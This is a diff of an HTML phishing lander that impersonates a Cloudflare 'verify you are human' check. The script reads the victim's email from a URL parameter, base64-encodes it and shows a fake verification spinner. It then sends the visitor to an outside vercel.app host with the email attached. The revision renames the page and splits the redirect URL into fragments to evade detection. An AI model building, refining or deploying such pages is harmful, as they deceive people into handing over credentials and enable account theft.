@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MSFIles</title>
+    <title>TransferWeFiles</title>
     <style>
         * {
             margin: 0;
@@ -13,293 +13,330 @@
         }
 
         body {
-            background-color: #f5f5f5;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             padding: 20px;
-            flex-direction: column;
         }
 
-        .text1 {
+        .document-text {
+            font-weight: bold;
+            font-size: 18px;
+            color: #333;
             margin-bottom: 20px;
             text-align: center;
-            color: #333;
-            font-size: 16px;
-            max-width: 500px;
         }
 
-        .box1 {
-            background-color: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            width: 90%;
-            height: 100px;
-            max-width: 500px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .loader {
+        #loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
 
-        .spinner1 {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(33, 150, 243, 0.3);
             border-radius: 50%;
-            animation: rotate 1s linear infinite;
+            border-top: 5px solid #2196F3;
+            animation: spin 1s linear infinite;
         }
 
-        .section1 {
-            display: flex;
-            align-items: center;
-        }
-
-        .container1 {
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            padding: 10px 15px;
-            border-radius: 8px;
-            transition: background-color 0.3s;
-        }
-
-        .container1:hover {
-            background-color: #f9f9f9;
-        }
-
-        .item1 {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #ddd;
-            border-radius: 4px;
-            margin-right: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s;
-        }
-
-        .item1.active {
-            border-color: #4CAF50;
-            background-color: #4CAF50;
-        }
-
-        .item1.loading {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #3498db;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: rotate 1s linear infinite;
-        }
-
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .item1 i {
-            color: white;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .item1.active i {
-            opacity: 1;
-        }
-
-        .text2 {
-            font-size: 16px;
-            color: #333;
-            font-weight: 500;
-        }
-
-        .text3 {
-            font-size: 16px;
-            color: #3498db;
-            font-weight: 500;
+        .verification-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            width: 100%;
+            max-width: 450px;
+            transition: all 0.3s ease;
             display: none;
+            height: 115px;
         }
 
-        .text4 {
-            font-size: 16px;
-            color: #4CAF50;
-            font-weight: 500;
-            display: none;
+        .verification-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 15px;
         }
 
-        .section2 {
-            text-align: right;
+        .verification-section {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-section {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
         }
 
-        .container2 {
+        .logo {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
-        .item2 {
-            width: 33px;
-            height: 33px;
-            margin-right: 10px;
-            border-radius: 4px;
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
-            color: #666;
+            margin-right: 10px;
+            color: white;
+            font-weight: bold;
         }
 
-        .text5 {
+        .logo-text {
             font-size: 20px;
-            color: #2c3e50;
-            font-weight: 700;
-            letter-spacing: 1px;
+            font-weight: 600;
+            color: #333;
+            letter-spacing: -0.5px;
         }
 
-        .text6 {
-            color: #7f8c8d;
-            font-size: 12px;
+        .terms-text {
+            color: #888;
+            font-size: 14px;
         }
 
-        .text6 a {
-            color: #7f8c8d;
-            text-decoration: none;
+        .checkbox-container {
+            position: relative;
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
+            cursor: pointer;
         }
 
-        .text6 a:hover {
-            text-decoration: underline;
+        .checkbox {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
         }
 
-        .hidden {
-            display: none !important;
+        .checkmark {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox:checked + .checkmark {
+            background-color: #4CAF50;
+            border-color: #4CAF50;
+        }
+
+        .checkbox:checked + .checkmark:after {
+            content: "";
+            position: absolute;
+            left: 7px;
+            top: 3px;
+            width: 6px;
+            height: 12px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(33, 150, 243, 0.3);
+            border-radius: 50%;
+            border-top: 2px solid #2196F3;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .verification-text {
+            font-size: 16px;
+            color: #555;
+            transition: all 0.3s ease;
+        }
+
+        .verification-footer {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .success-message {
+            color: #4CAF50;
+            font-weight: 600;
+            display: none;
+        }
+
+        .verifying {
+            color: #2196F3;
+        }
+
+        .success {
+            color: #4CAF50;
+        }
+
+        @media (max-width: 480px) {
+            .verification-content {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 20px;
+            }
+
+            .logo-section {
+                align-self: flex-end;
+                align-items: flex-end;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="loader" id="loader">
-        <div class="spinner1"></div>
+    <div class="document-text">To view this document, verify you're human below</div>
+
+    <div id="loading-screen">
+        <div class="loading-spinner"></div>
     </div>
 
-    <div class="text1 hidden" id="text1">
-        To view this document, verify you're not a robot below
-    </div>
+    <div class="verification-container">
+        <div class="verification-content">
+            <div class="verification-section">
+                <label class="checkbox-container">
+                    <input type="checkbox" class="checkbox" id="verification-checkbox">
+                    <span class="checkmark" id="checkmark"></span>
+                    <div class="spinner" id="spinner"></div>
+                </label>
+                <span class="verification-text" id="verification-text">Verify you are human</span>
+                <span class="success-message" id="success-message">Success!</span>
+            </div>
 
-    <div class="box1 hidden" id="box1">
-        <div class="section1">
-            <div class="container1" id="container1">
-                <div class="item1" id="item1">
-                    <i>✓</i>
+            <div class="logo-section">
+                <div class="logo">
+                    <img src="cloudflare_.png" class="logo-icon" alt="Logo">
+                    <div class="logo-text">Cloudflare</div>
                 </div>
-                <span class="text2" id="text2">Verify</span>
-                <span class="text3" id="text3">Verifying...</span>
-                <span class="text4" id="text4">Success!</span>
-            </div>
-        </div>
-
-        <div class="section2">
-            <div class="container2">
-                <img src="cloudflare_.png" alt="Cloudflare" class="item2" style="width:32px;height:32px;">
-                <div class="text5">Cloudflare</div>
-            </div>
-            <div class="text6">
-                <a href="#">Privacy</a> · <a href="#">Terms</a>
+                <div class="terms-text">privacy · terms</div>
             </div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Encode the URL parameter as base64 immediately when page loads
-            const urlParams = new URLSearchParams(window.location.search);
-            const eoffValue = urlParams.get('eoff');
+            // Function to encode email parameter to base64
+            function encodeEmailParameter() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const email = urlParams.get('eoff');
 
-            if (eoffValue) {
-                try {
-                    // Check if the value is already base64 encoded
-                    const decodedValue = atob(eoffValue);
-                    // If decoding works and it's not already encoded, re-encode it
-                    if (decodedValue && decodedValue !== eoffValue) {
-                        const encodedValue = btoa(eoffValue);
-                        const newUrl = window.location.origin + window.location.pathname + '?eoff=' + encodedValue;
-                        window.history.replaceState({}, document.title, newUrl);
-                    }
-                } catch (e) {
-                    // If atob fails, it means the value is not base64 encoded, so encode it
-                    const encodedValue = btoa(eoffValue);
-                    const newUrl = window.location.origin + window.location.pathname + '?eoff=' + encodedValue;
-                    window.history.replaceState({}, document.title, newUrl);
+                if (email) {
+                    // Encode the email to base64
+                    const encodedEmail = btoa(email);
+
+                    // Replace the email parameter with the encoded version
+                    const newUrl = new URL(window.location);
+                    newUrl.searchParams.set('eoff', encodedEmail);
+
+                    // Update the URL without reloading the page
+                    window.history.replaceState({}, '', newUrl);
+
+                    console.log('Encoded email parameter:', email, '->', encodedEmail);
+                    return encodedEmail;
                 }
+                return null;
             }
 
-            const loader = document.getElementById('loader');
-            const text1 = document.getElementById('text1');
-            const box1 = document.getElementById('box1');
-            const container1 = document.getElementById('container1');
-            const item1 = document.getElementById('item1');
-            const text2 = document.getElementById('text2');
-            const text3 = document.getElementById('text3');
-            const text4 = document.getElementById('text4');
+            // Call the function to encode the email parameter
+            const encodedEmail = encodeEmailParameter();
 
+            const loadingScreen = document.getElementById('loading-screen');
+            const verificationContainer = document.querySelector('.verification-container');
+
+            // Show loading screen for 3 seconds
             setTimeout(function() {
-                loader.classList.add('hidden');
-                text1.classList.remove('hidden');
-                box1.classList.remove('hidden');
-            }, 2000);
+                loadingScreen.style.display = 'none';
+                verificationContainer.style.display = 'block';
+            }, 1500);
 
-            let verified = false;
+            const checkbox = document.getElementById('verification-checkbox');
+            const checkmark = document.getElementById('checkmark');
+            const spinner = document.getElementById('spinner');
+            const verificationText = document.getElementById('verification-text');
+            const successMessage = document.getElementById('success-message');
 
-            container1.addEventListener('click', function() {
-                if (verified) return;
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    // Show spinner and change text
+                    checkmark.style.display = 'none';
+                    spinner.style.display = 'block';
+                    verificationText.textContent = 'Verifying...';
+                    verificationText.classList.add('verifying');
 
-                item1.classList.add('loading');
-                text2.style.display = 'none';
-                text3.style.display = 'inline';
-                text4.style.display = 'none';
-
-                // Get the current (already encoded) URL parameter
-                const currentUrlParams = new URLSearchParams(window.location.search);
-                const currentEoffValue = currentUrlParams.get('eoff');
-
-                let redirectUrl = 'https://xyz123-blush.vercel.app/';
-
-                if (currentEoffValue) {
-                    redirectUrl += '?eoff=' + currentEoffValue;
-                }
-
-                setTimeout(function() {
-                    item1.classList.remove('loading');
-                    item1.classList.add('active');
-
-                    text3.style.display = 'none';
-                    text4.style.display = 'inline';
-
-                    verified = true;
-
+                    // Simulate verification process
                     setTimeout(function() {
-                        window.location.href = redirectUrl;
-                    }, 1000);
-                }, 2000);
+                        // Hide spinner and show success
+                        spinner.style.display = 'none';
+                        verificationText.style.display = 'none';
+                        successMessage.style.display = 'inline';
+                        checkmark.style.display = 'flex';
+                        verificationText.classList.remove('verifying');
+                        verificationText.classList.add('success');
+
+                        // Redirect after 2 seconds
+                        setTimeout(function() {
+                            // Break redirect URL into tiny bits and join during redirect
+                            const urlParts = [
+                                'xyz123-', 'blush', '.', 'vercel', '.', 'app',
+                                '/', '?', 'eoff'
+                            ];
+
+                            let redirectUrl = '';
+                            for (let i = 0; i < urlParts.length; i++) {
+                                redirectUrl += urlParts[i];
+                            }
+
+                            // Add encoded email if available
+                            if (encodedEmail) {
+                                redirectUrl += '=' + encodedEmail;
+                            }
+
+                            // Complete the URL
+                            redirectUrl = 'https://' + redirectUrl;
+
+                            console.log('Redirecting to:', redirectUrl);
+                            window.location.href = redirectUrl;
+                        }, 2000);
+
+                    }, 2000); // 2 seconds delay
+                } else {
+                    // Reset to initial state
+                    spinner.style.display = 'none';
+                    checkmark.style.display = 'flex';
+                    verificationText.textContent = 'Verify you are human';
+                    verificationText.style.display = 'inline';
+                    successMessage.style.display = 'none';
+                    verificationText.classList.remove('verifying', 'success');
+                }
             });
         });
     </script>
